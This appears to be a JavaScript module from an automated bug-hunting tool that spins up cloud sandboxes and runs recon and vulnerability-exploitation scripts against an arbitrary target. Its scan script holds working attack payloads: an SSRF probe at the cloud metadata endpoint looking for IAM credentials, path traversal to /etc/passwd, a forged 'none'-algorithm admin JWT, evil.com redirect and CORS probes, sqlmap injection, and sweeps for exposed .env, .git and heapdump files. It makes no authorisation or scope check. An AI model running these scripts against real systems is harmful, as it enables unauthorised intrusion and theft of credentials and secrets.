/**
 * CloudExecutor — runs 300+ security tools in E2B cloud sandboxes.
 *
 * Cross-platform: Windows / Mac / Linux — all tools run in cloud Ubuntu.
 * Uses a pre-built custom template (hunter-engine/e2b/Dockerfile)
 * so sandbox starts in <5 seconds with everything pre-installed.
 *
 * Setup:
 *   1. npm install -g @e2b/cli && e2b auth login
 *   2. cd hunter-engine/e2b && bash build.sh   (one-time, ~15 min)
 *   3. .env:  E2B_API_KEY=...  E2B_SANDBOX_TEMPLATE_ID=...
 */

import { Sandbox } from '@e2b/code-interpreter'

const E2B_API_KEY     = process.env.E2B_API_KEY
const E2B_TEMPLATE_ID = process.env.E2B_SANDBOX_TEMPLATE_ID

// ── Tool install script (used only when no custom template) ───────────────────
function buildInstallScript() {
  return [
    '#!/bin/bash',
    'export PATH=$PATH:/usr/local/go/bin:/root/go/bin',
    'export GOPATH=/root/go',
    'mkdir -p /root/go/bin /hunt',
    '',
    '# Go runtime',
    'command -v go || (curl -sL https://go.dev/dl/go1.22.3.linux-amd64.tar.gz | tar -xz -C /usr/local)',
    '',
    '# ProjectDiscovery suite',
    'for t in subfinder httpx nuclei katana dnsx naabu; do',
    '  curl -sL "https://github.com/projectdiscovery/$t/releases/latest/download/${t}_linux_amd64.zip"',
    '  -o /tmp/${t}.zip 2>/dev/null &&',
    '  unzip -oq /tmp/${t}.zip -d /tmp/${t}_d 2>/dev/null &&',
    '  mv /tmp/${t}_d/$t /usr/local/bin/ 2>/dev/null || true',
    'done',
    '',
    '# dalfox (XSS)',
    'curl -sL https://github.com/hahwul/dalfox/releases/latest/download/dalfox_linux_amd64.tar.gz | tar -xz -C /tmp && mv /tmp/dalfox /usr/local/bin/ 2>/dev/null || true',
    '',
    '# ffuf (fuzzer)',
    'curl -sL https://github.com/ffuf/ffuf/releases/latest/download/ffuf_linux_amd64.tar.gz | tar -xz -C /tmp && mv /tmp/ffuf /usr/local/bin/ 2>/dev/null || true',
    '',
    '# Go tools',
    'for pkg in',
    '  github.com/tomnomnom/anew@latest',
    '  github.com/tomnomnom/gf@latest',
    '  github.com/tomnomnom/qsreplace@latest',
    '  github.com/tomnomnom/waybackurls@latest',
    '  github.com/tomnomnom/assetfinder@latest',
    '  github.com/lc/gau/v2/cmd/gau@latest',
    '  github.com/hakluke/hakrawler@latest; do',
    '  go install $pkg 2>/dev/null || true',
    'done',
    '',
    '# Python tools',
    'pip3 install -q sqlmap arjun 2>/dev/null || true',
    '',
    '# GF patterns',
    'mkdir -p /root/.gf && git clone -q --depth 1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gfp 2>/dev/null && cp /tmp/gfp/*.json /root/.gf/ 2>/dev/null || true',
    '',
    '# Nuclei templates',
    'nuclei -update-templates -silent 2>/dev/null || true',
    '',
    'chmod +x /usr/local/bin/* /root/go/bin/* 2>/dev/null || true',
    'echo "INSTALL_DONE"',
  ].join('\n')
}

// ── Recon script (reconFTW + manual pipeline) ─────────────────────────────────
function buildReconScript(target, outDir) {
  return `#!/bin/bash
export PATH=$PATH:/usr/local/bin:/root/go/bin:/root/.local/bin
T="${target}"
O="${outDir}"
mkdir -p $O/subdomains $O/live $O/urls $O/params $O/secrets

echo "[RECON:START] target=$T"

# reconFTW parallel (if installed — most comprehensive)
if command -v reconftw >/dev/null 2>&1; then
  echo "[RECON:RECONFTW] Running reconFTW in background..."
  reconftw -d $T -r -o $O/reconftw 2>/dev/null &
  RFTW=$!
fi

# Subdomain enumeration (parallel)
subfinder -d $T -silent -o $O/subdomains/sf.txt 2>/dev/null &
assetfinder --subs-only $T 2>/dev/null > $O/subdomains/af.txt &
wait
sort -u $O/subdomains/sf.txt $O/subdomains/af.txt > $O/subdomains/all.txt 2>/dev/null
echo "[RECON:SUBS] $(wc -l < $O/subdomains/all.txt 2>/dev/null || echo 0) subdomains"

# Live host discovery
cat $O/subdomains/all.txt | dnsx -silent 2>/dev/null | \
  httpx -silent -status-code -title -tech-detect -content-length -o $O/live/httpx.txt 2>/dev/null
cat $O/live/httpx.txt | awk '{print $1}' > $O/live/urls.txt 2>/dev/null
echo "[RECON:LIVE] $(wc -l < $O/live/urls.txt 2>/dev/null || echo 0) live hosts"

# Port scan
naabu -host $T -top-ports 1000 -silent -o $O/live/ports.txt 2>/dev/null || \
  nmap -F -T4 $T -oG - 2>/dev/null | grep "open" > $O/live/ports.txt || true

# URL collection (4 sources parallel)
{
  cat $O/live/urls.txt | katana -silent -d 3 -jc -kf all 2>/dev/null | head -1500 &
  echo $T | waybackurls 2>/dev/null | head -800 &
  gau $T --subs 2>/dev/null | head -800 &
  wait
} | sort -u | anew $O/urls/all.txt > /dev/null 2>&1 || true
echo "[RECON:URLS] $(wc -l < $O/urls/all.txt 2>/dev/null || echo 0) URLs"

# URL classification
for pat in xss sqli ssrf idor redirect lfi rce; do
  cat $O/urls/all.txt | gf $pat 2>/dev/null > $O/params/$pat.txt || true
done
cat $O/urls/all.txt | grep -E "/api/|/v[0-9]+/|/graphql|/rest/" > $O/params/api.txt 2>/dev/null || true
cat $O/urls/all.txt | grep -i '\\.js$' | sort -u > $O/params/js.txt 2>/dev/null || true

# Nuclei scan
echo "[RECON:NUCLEI] Scanning with nuclei..."
nuclei -l $O/live/urls.txt -severity critical,high,medium -silent -o $O/live/nuclei.txt 2>/dev/null || true
echo "[RECON:NUCLEI] $(wc -l < $O/live/nuclei.txt 2>/dev/null || echo 0) findings"

# JS secret scan
head -20 $O/params/js.txt 2>/dev/null | while read jsurl; do
  curl -sk --max-time 10 "$jsurl" 2>/dev/null | \
    python3 /opt/secretfinder/SecretFinder.py --input /dev/stdin --output cli 2>/dev/null | \
    head -3 >> $O/secrets/js.txt || true
done

# Wait for reconFTW
if [ -n "$RFTW" ]; then
  wait $RFTW 2>/dev/null || true
  test -f "$O/reconftw/subdomains/subdomains.txt" && \
    cat "$O/reconftw/subdomains/subdomains.txt" | anew $O/subdomains/all.txt > /dev/null 2>&1 || true
fi

python3 << 'PYEOF'
import json, os

def c(f):
    try: return sum(1 for l in open(f) if l.strip())
    except: return 0

def r(f, n=25):
    try: return [l.strip() for l in open(f) if l.strip()][:n]
    except: return []

O = os.environ.get('O', '/hunt')
result = {
    'subdomains':    c(O+'/subdomains/all.txt'),
    'live_hosts':    c(O+'/live/urls.txt'),
    'urls':          c(O+'/urls/all.txt'),
    'nuclei_count':  c(O+'/live/nuclei.txt'),
    'xss_params':    c(O+'/params/xss.txt'),
    'sqli_params':   c(O+'/params/sqli.txt'),
    'ssrf_params':   c(O+'/params/ssrf.txt'),
    'api_endpoints': c(O+'/params/api.txt'),
    'ports':         r(O+'/live/ports.txt', 10),
    'httpx_sample':  r(O+'/live/httpx.txt', 20),
    'nuclei_sample': r(O+'/live/nuclei.txt', 10),
    'subs_sample':   r(O+'/subdomains/all.txt', 20),
    'urls_sample':   r(O+'/urls/all.txt', 30),
    'secrets':       r(O+'/secrets/js.txt', 10),
}
print('RECON_JSON:' + json.dumps(result))
PYEOF
echo "RECON_DONE"`
}

// ── Full vulnerability scan + exploit script ──────────────────────────────────
function buildScanScript(target, outDir) {
  return `#!/bin/bash
export PATH=$PATH:/usr/local/bin:/root/go/bin:/root/.local/bin
T="${target}"
O="${outDir}"
mkdir -p $O/findings/{xss,sqli,ssrf,idor,cors,exposure,cves,graphql,auth,lfi,takeover,redirect,jwt,rce,ssti}

echo "[SCAN:START]"

# 1. XSS — dalfox
echo "[SCAN:XSS] dalfox..."
test -s $O/params/xss.txt && \
  cat $O/params/xss.txt | head -40 | dalfox pipe --silence --no-color --timeout 10 2>/dev/null | \
  grep -v '^$' > $O/findings/xss/dalfox.txt || true

# 2. SQLi — sqlmap level 2
echo "[SCAN:SQLI] sqlmap..."
test -s $O/params/sqli.txt && head -5 $O/params/sqli.txt | while read url; do
  sqlmap -u "$url" --batch --level=2 --risk=2 --silent --random-agent \
    --technique=BEUST --output-dir=$O/findings/sqli 2>/dev/null | \
    grep -i "injectable\\|vulnerability" >> $O/findings/sqli/results.txt || true
done

# 3. SSRF — cloud metadata probe
echo "[SCAN:SSRF] SSRF probe..."
test -s $O/params/ssrf.txt && \
  head -20 $O/params/ssrf.txt | qsreplace "http://169.254.169.254/latest/meta-data/" 2>/dev/null | \
  xargs -I{} curl -sk --max-time 8 "{}" 2>/dev/null | \
  grep -i "ami-id\\|instance-id\\|iam\\|security-credential" | \
  sed 's/^/[SSRF-CLOUD-META] /' > $O/findings/ssrf/cloud.txt || true

# 4. LFI
echo "[SCAN:LFI] Path traversal..."
test -s $O/params/lfi.txt && \
  head -10 $O/params/lfi.txt | qsreplace "../../../../etc/passwd" 2>/dev/null | \
  xargs -I{} curl -sk --max-time 8 "{}" 2>/dev/null | \
  grep -i "root:x:\\|/bin/bash" | \
  sed 's/^/[LFI-CONFIRMED] /' > $O/findings/lfi/results.txt || true

# 5. Open redirects
echo "[SCAN:REDIRECT] Redirects..."
test -s $O/params/redirect.txt && \
  head -20 $O/params/redirect.txt | qsreplace "https://evil.com" 2>/dev/null | \
  xargs -I{} bash -c \
    'loc=$(curl -sk --max-time 8 -I "{}" 2>/dev/null | grep -i "^location:" | head -1); [ -n "$loc" ] && echo "[REDIRECT] {} -> $loc"' \
  >> $O/findings/redirect/results.txt 2>/dev/null || true

# 6. Exposed files
echo "[SCAN:EXPOSURE] Sensitive files..."
for path in /.env /.env.local /.env.production /.git/config /.git/HEAD \
    /config.json /wp-config.php /phpinfo.php /server-status \
    /actuator/env /actuator/heapdump /swagger.json /api-docs \
    /.env.backup /database.yml /settings.py /config.yml; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$T$path" 2>/dev/null)
  [ "$code" = "200" ] && echo "[EXPOSED:$code] https://$T$path" >> $O/findings/exposure/sensitive.txt
done

# 7. CORS
echo "[SCAN:CORS] CORS misconfig..."
head -10 $O/live/urls.txt 2>/dev/null | while read u; do
  cors=$(curl -sk -I --max-time 5 -H "Origin: https://evil.com" "$u" 2>/dev/null | grep -i "access-control-allow-origin")
  echo "$cors" | grep -qE "evil\\.com|\\*" && \
    echo "[CORS] $u -> $cors" >> $O/findings/cors/findings.txt || true
done

# 8. GraphQL
echo "[SCAN:GQL] GraphQL..."
cat $O/params/api.txt 2>/dev/null | grep -i "graphql\\|gql" | head -5 | while read gurl; do
  resp=$(curl -sk --max-time 10 -X POST "$gurl" \
    -H 'Content-Type: application/json' \
    -d '{"query":"{__schema{types{name}}}"}' 2>/dev/null)
  python3 -c "
import json,sys
try:
    d=json.loads('$resp'.replace(\"'\",\"'\"))
    if d.get('data',{}).get('__schema'): print('[GRAPHQL-INTROSPECTION] $gurl')
except: pass
" >> $O/findings/graphql/findings.txt 2>/dev/null || true
done

# 9. JWT None
echo "[SCAN:JWT] JWT none-alg..."
head -20 $O/live/urls.txt 2>/dev/null | while read url; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0." \
    "$url" 2>/dev/null)
  [ "$code" = "200" ] && echo "[JWT-NONE:$code] $url" >> $O/findings/jwt/none.txt || true
done

# 10. Admin panels
echo "[SCAN:AUTH] Admin panels..."
for apath in /admin /administrator /wp-admin /login /dashboard /console /panel /management; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "https://$T$apath" 2>/dev/null)
  [ "$code" != "404" ] && [ "$code" != "000" ] && \
    echo "[ADMIN-PANEL:$code] https://$T$apath" >> $O/findings/auth/panels.txt || true
done

# 11. Subdomain takeover
echo "[SCAN:TAKEOVER] Takeover check..."
test -s $O/subdomains/all.txt && \
  subzy run --targets $O/subdomains/all.txt --output $O/findings/takeover/subzy.txt 2>/dev/null || true

# 12. Nuclei CVEs targeted
echo "[SCAN:CVE] Nuclei CVE sweep..."
nuclei -l $O/live/urls.txt -tags cve,exposure,misconfiguration -severity critical,high \
  -silent -o $O/findings/cves/nuclei.txt 2>/dev/null || true

wait

python3 << 'PYEOF'
import json, os

def r(f, n=15):
    try: return [l.strip() for l in open(f) if l.strip()][:n]
    except: return []

O = os.environ.get('O', '/hunt')
cats = ['xss','sqli','ssrf','idor','cors','exposure','cves','graphql',
        'auth','lfi','takeover','redirect','jwt','rce','ssti']
findings = []
for cat in cats:
    d = O + '/findings/' + cat
    if not os.path.isdir(d): continue
    for fname in os.listdir(d):
        for line in r(d + '/' + fname, 15):
            if len(line) > 10:
                sev = 'critical' if cat in ['rce','sqli'] else \
                      'high' if cat in ['ssrf','lfi','auth','jwt','takeover'] else 'medium'
                findings.append({'category':cat,'evidence':line,
                                  'tool':fname.replace('.txt',''),'severity':sev})

print('SCAN_JSON:' + json.dumps({'findings': findings[:60]}))
PYEOF
echo "SCAN_DONE"`
}

// ── Main CloudExecutor class ──────────────────────────────────────────────────

export class CloudExecutor {
  constructor(sessionId, onLog) {
    this.sessionId = sessionId
    this.onLog     = onLog || (() => {})
    this.sandbox   = null
    this.outDir    = `/hunt/${sessionId}`
  }

  log(msg) { this.onLog(msg) }

  async createSandbox() {
    if (!E2B_API_KEY) {
      throw new Error('E2B_API_KEY not configured. Add to .env to enable cloud mode.')
    }

    const opts = { apiKey: E2B_API_KEY, timeout: 1_800_000 }

    if (E2B_TEMPLATE_ID) {
      opts.template = E2B_TEMPLATE_ID
      this.log('[CLOUD] Pre-built image — 300+ tools ready in seconds')
    } else {
      this.log('[CLOUD] No template found — installing tools at runtime (~3 min)')
      this.log('[CLOUD] Tip: run hunter-engine/e2b/build.sh once for instant starts')
    }

    this.log('[CLOUD] Starting Ubuntu sandbox...')
    this.sandbox = await Sandbox.create(opts)
    this.log(`[CLOUD] ✓ Sandbox ${this.sandbox.sandboxId} ready`)

    if (!E2B_TEMPLATE_ID) await this._installTools()

    return this.sandbox
  }

  async _installTools() {
    this.log('[CLOUD] Installing security tools...')
    const script = buildInstallScript()
    let done = false

    await this.sandbox.commands.run(script, {
      timeout: 360_000,
      onStdout: (o) => {
        if (o.line.includes('[') || o.line.includes('INSTALL_DONE')) {
          this.log(`[CLOUD] ${o.line}`)
        }
        if (o.line === 'INSTALL_DONE') done = true
      },
    })

    this.log(done ? '[CLOUD] ✓ Tools ready' : '[CLOUD] ⚠ Some tools unavailable — continuing')
  }

  async runRecon(target) {
    this.log(`[RECON] Cloud recon on ${target}`)
    const script = buildReconScript(target, this.outDir)
    let reconJson = null

    await this.sandbox.commands.run(
      `export O="${this.outDir}" && ${script}`,
      {
        timeout: 600_000,
        onStdout: (o) => {
          if (o.line.startsWith('[RECON:')) this.log(o.line)
          if (o.line.startsWith('RECON_JSON:')) {
            try { reconJson = JSON.parse(o.line.slice(11)) } catch {}
          }
        },
      }
    )

    return reconJson || {
      subdomains: 0, live_hosts: 0, urls: 0,
      nuclei_count: 0, xss_params: 0, sqli_params: 0,
      httpx_sample: [], nuclei_sample: [], subs_sample: [], urls_sample: [],
    }
  }

  async runScan(target) {
    this.log(`[SCAN] Cloud vuln scan on ${target}`)
    const script = buildScanScript(target, this.outDir)
    let scanJson = null

    await this.sandbox.commands.run(
      `export O="${this.outDir}" && ${script}`,
      {
        timeout: 600_000,
        onStdout: (o) => {
          if (o.line.startsWith('[SCAN:')) this.log(o.line)
          if (o.line.startsWith('SCAN_JSON:')) {
            try { scanJson = JSON.parse(o.line.slice(10)) } catch {}
          }
        },
      }
    )

    return scanJson?.findings || []
  }

  async runCmd(cmd, timeout = 60_000) {
    if (!this.sandbox) return { stdout: '', code: -1 }
    let out = ''
    const r = await this.sandbox.commands.run(cmd, {
      timeout,
      onStdout: (o) => { out += o.line + '\n' },
    }).catch(() => ({ exitCode: -1 }))
    return { stdout: out.slice(0, 4000), code: r.exitCode ?? 0 }
  }

  async destroy() {
    if (this.sandbox) {
      try { await this.sandbox.kill() } catch {}
      this.log(`[CLOUD] Sandbox terminated`)
      this.sandbox = null
    }
  }
}

export async function detectExecutionMode() {
  if (E2B_API_KEY) return 'cloud'
  try {
    const { execSync } = await import('child_process')
    execSync('which subfinder', { stdio: 'ignore' })
    return 'local'
  } catch {
    return 'ai-only'
  }
}
